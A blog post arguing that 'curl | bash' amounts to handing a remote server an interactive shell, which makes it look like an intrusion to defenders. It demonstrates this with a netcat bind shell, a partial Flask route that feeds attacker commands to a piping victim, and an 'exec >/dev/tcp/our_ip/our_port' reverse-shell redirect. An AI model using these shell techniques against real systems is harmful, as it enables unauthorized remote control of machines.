---
layout: post
title:  "Interactivity is the halting problem in a trench coat."
date:   2023-05-05 15:00:00 -0400
categories: linux
tags: [linux, shells, security, screamingintothevoid]
---

Or: please, _please_, stop piping `curl` into `bash` in prod.

**TL;DR:** A shell's built-in understanding (and the conventional understanding)
of its own interactivity is different from what might be considered interactive
from a security perspective. From a defensive security point of view, piping
`curl` into `bash` is indistinguishable from an interactive shell. Because of
the halting problem (kinda).

**'TL;DR'TL;DR:** My head hurts and I want to go home.

## Interactive shells mean something bad happened, right?

Interactive shells in production are generally a bad sign, right? In modern
infrastructure, if you're using some infrastructure-as-code tool, you're
probably never shelling into a Linux box unless [something has gone horribly
wrong](https://about.gitlab.com/blog/2017/02/10/postmortem-of-database-outage-of-january-31/).
And you probably want to avoid doing so if it's at all possible, because of how
error prone it can be to fix production issues this way. [Cattle, not
pets](https://devops.stackexchange.com/questions/653/what-is-the-definition-of-cattle-not-pets),
right? And barring those something-has-gone-terribly-wrong circumstances, an
interactive shell is likely the sign of an attacker... right? So you probably
want to know when an interactive shell is opened on a production system, right?

...right?

## What even is an interactive shell? Nobody has ever explained it to me.

I want you to think about what an interactive shell is before you keep reading.
Write it down if you have to. You're probably wrong. From a certain point of
view, anyway.

I asked some friends this question and got a mix of answers.

> Question for the class: if I tell you I have two `bash` pids, 123 and 456, and
> then I tell you "123 is interactive, but 456 is not" what is the difference
> between them?

One answer was "123 was spawned from a TTY and 456 was not." This might seem
like a good answer, but you can definitely spawn an interactive shell without
a TTY involved.

```
$ docker run --rm ubuntu:22.04 \
    bash -c 'echo -n '"'"'echo $- && ls -l /proc/$$/fd'"'"' | bash -i'

bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
root@7aa6f2237867:/# echo $- && ls -l /proc/$$/fd
hiBHs
total 0
lr-x------ 1 root root 64 May  5 15:35 0 -> pipe:[52434]
l-wx------ 1 root root 64 May  5 15:35 1 -> pipe:[50764]
l-wx------ 1 root root 64 May  5 15:35 2 -> pipe:[50765]
l-wx------ 1 root root 64 May  5 15:35 255 -> pipe:[50765]
root@7aa6f2237867:/# exit
```

First we query `bash` for the flags it was started with (`$-`). We can see the
`i` flag is present, and we can see the `$PS1` prompt. This `bash` process
believes itself to be interactive. It was not spawned from a TTY, and it is not
interacting with a TTY from its own perspective, which we can see when we check
its open file descriptors.

Another answer I got was along the lines of "123 is waiting for user input, and
456 is just executing a script." That's a better answer, but it's still not
quite correct. Here's a script that will definitely interact with the user, but
believes itself to be operating non-interactively.

```
$ echo -n '#!/usr/bin/env bash\necho $-\nread -n 1 -p "Press a key!" _\n' > tmp.sh
$ chmod +x tmp.sh
$ bash -c ./tmp.sh
hB
Press a key!
$
```

As you can see, no `i` flag is set in the bash process running the script, but
it waits for us to press a key before continuing. You might be thinking, "sure,
the _script_ is interactive, but the _shell_ isn't." To which I say,
"semantics." Pretend I'm an adversary. I am interacting with this shell. It is
interactive. Here's a stronger (skid-ier?) example.

#### Terminal 1

```
$ nc.traditional -lvp 4444 -e /bin/bash 2>/dev/null
```

#### Terminal 2

```
$ nc localhost 4444
ls -l /proc/$$/fd
total 0
lrwx------ 1 senicar senicar 64 May  5 15:50 0 -> socket:[55727]
lrwx------ 1 senicar senicar 64 May  5 15:50 1 -> socket:[55727]
l-wx------ 1 senicar senicar 64 May  5 15:50 2 -> /dev/null
echo $-
hBs
```

No `i` flag. No TTY. No `$PS1`. Fully interactive. If you've done any kind of
Linux offensive work, or, like, any CTF, you probably already know this.

## What's all this about an `i` flag, then?

Let's ~~shamelessly steal~~ liberally draw inspiration from [this stackexchange
post](https://unix.stackexchange.com/questions/277130/bash-c-and-noninteractive-shell/277153#277153).
The `i` flag is set in `bash` when `bash` considers itself to be interactive.
What defines `bash` as being non-interactive? Whatever `bash` does when you call
it with `-c`. [This function, that's
it](https://github.com/bminor/bash/blob/ec8113b9861375e4e17b3307372569d429dec814/shell.c#L1860).
Non-interactive means no command history, no job management, no line editing, no
prompt, and errors can't be ignored. We've clearly demonstrated interactivity
without these features, so the internal `bash` understanding of interactive
clearly doesn't match the security-oriented understanding.

There must be other definitions. Let's check those!

Here's what [the `glibc`
manual](https://web.archive.org/web/20221210223404/https://www.gnu.org/software/libc/manual/html_node/Concepts-of-Job-Control.html)
says:

> The fundamental purpose of an interactive shell is to read commands from the
> user’s terminal and create processes to execute the programs specified by those
> commands.

In other words, interactive means that the shell's standard input is a TTY. We
know this isn't necessary for interactivity. Next.

What about that warning `apt` gives you in a script? The one that says "Use with
caution in scripts." How is `apt` detecting interactivity in practice? [Let's
check the source](https://salsa.debian.org/apt-team/apt/-/blob/9e1398b164f55238990907f63dfdef60588d9b24/apt-private/private-main.cc#L79).


```c++
   if(!isatty(STDOUT_FILENO) &&
      _config->FindB("Apt::Cmd::Disable-Script-Warning", false) == false)
   {
      std::cerr << std::endl
                << "WARNING: " << flNotDir(argv[0]) << " "
                << "does not have a stable CLI interface. "
                << "Use with caution in scripts."
                << std::endl
                << std::endl;
   }
```

Oh, it's checking if standard output is a TTY. We've already shown that's not
required for interactivity. Boo.

What about POSIX? Let's look at how [they specify
sh](https://pubs.opengroup.org/onlinepubs/9699919799/utilities/sh.html). From
POSIX's perspective, `sh` is interactive if it's started with `-i`, _or_ if it
has no arguments but standard input **and** standard output are a TTY. This is
more constrained than apt, similar to what we see in glibc, and still not useful
from a security perspective.

## Please just tell me what "interactive" means to you.

My favorite answer to the "what distinguishes pid 123 from pid 456" question
came from Patton Oswalt in Ratatouille. 

> Process 123 has a loop that alters its program flow to reach new branches
> pending input via file descriptors (e.g., stdin or the network) or process
> signals. Process 456 has a loop with a defined set of program flow branches that
> will be reached as defined by a preset configuration at the start of the
> process.

I think that's perfect. An interactive shell (or interactive process in general)
is one that sits and waits for _something_ to happen to it, and that _something_
determines control flow. A non-interactive program has all of its instructions
known at the time it starts. It doesn't sit around and wait for more, it just
chugs along doing its thing. For example, `bash -c 'echo "Hello, world!"'` is
non-interactive, because we know all the instructions before it starts. It won't
change, it won't wait to receive more from `stdin`, or a pipe, or a socket. It
echoes out "Hello, world!", then exits. In contrast, `nc -lvp 4444 | /bin/bash`
is interactive, even if we spawn it (like we did above) without the `i` flag or
without a TTY being involved. Its control flow is being determined at runtime,
based on whatever information is coming into it from a pipe, which is itself
receiving information from the network. For it to be a shell and not just a
process it should have some loop that performs arbitrary command interpretation,
distinguishing an interactive shell from, say, a web server. Beautiful.

Wait a minute.

> a defined set of program flow branches that will be reached as defined by a
> preset configuration at the start of the process

Ah crap, that's [the halting
problem](https://en.wikipedia.org/wiki/Halting_problem). Determining that a
shell is non-interactive means determining that it will halt.

## What does this have to do with `curl` and pipes?

Let's just... ignore that. For a moment. In practice it's not that big of a
deal. Most scripts are simple enough that we can actually determine that they'll
halt. If you slap a `-s -- -y` to the end of the [rust installer
command](https://rustup.rs/), you can manually trace it doing its thing, then
stopping. If you don't, you can see it starts waiting for user input (forever,
if you ignore it). So if we can easily determine that this `curl | sh` will
halt, and is non-interactive, why did I claim that it was at the start of this
post?

> at the start of the process

When `sh` starts here, we don't have the whole script. When you trace the script
manually to watch it end, you're doing so after it's already been downloaded.
When you pipe something into a shell directly from the network you are not
running a script. You are giving an interactive shell to some web server and
asking it to please do its thing thank you.

Most of the time this is actually fine. There's no meaningful difference between
downloading an installer off rustup.rs and giving them a shell. I'm trusting
them to run code on my box either way. But if you're, say, running container in
production there is a meaningful security difference between running an
installer with a finite set of instructions and giving a third party service a
shell. Yes, you can still trust rustup.rs either way. 

But for your security team, from a behavioral perspective, running the installer
by piping it into `sh` instead of running it off disk looks _exactly the same_
as an adversary popping a shell on your box with `nc`. Your adversaries know
this, and they're laughing at you whenever you do it.

Back in 2016 someone wrote a blog post about [detecting the use of `curl | bash`
server
side](https://web.archive.org/web/20230101004612/https://www.idontplaydarts.com/2016/04/detecting-curl-pipe-bash-server-side/)
and selectively feeding an end user malicious code. The server is making a
determination about what's downloading from it, and feeding different content
based on that determination. The interpreter on the victim side does different
things based on that determination, because it's not really non-interactive.
It's sitting in a loop, waiting for the next command to come in. It's being
interacted with.

We can take this concept and turn it into something human interactive. That is,
we can take `curl | sh`, and give ourselves a shell. Here's some mock python
code for a flask app does just that. The remainder of the code is left as an
exercise to the reader.

```python
def shell_route():
    def generate():
        while True:
            cmd = input("$ ")
            yield f'{cmd}\necho {(chr(33) + "1") * 4096} >/dev/null\n'
    return app.response_class(stream_with_context(generate()), mimetype='text/plain')
```

This will let us send commands. If we want to get replies, we can do something
like set up a listener with netcat send `exec >/dev/tcp/our_ip/our_port` as the
first command. This will redirect output back to us. Bam, shell.

Why would you ever do this? I have no idea. There's really no point. If someone
is downloading and running your code, there's no reason to go through the effort
of making it interactive. It's quite silly. But it does work! In an extremely
reductive and pedantic sense, `curl | sh` is an interactive shell. And that
tickles my brain. It also makes your security team's job harder, so please stop
doing it.
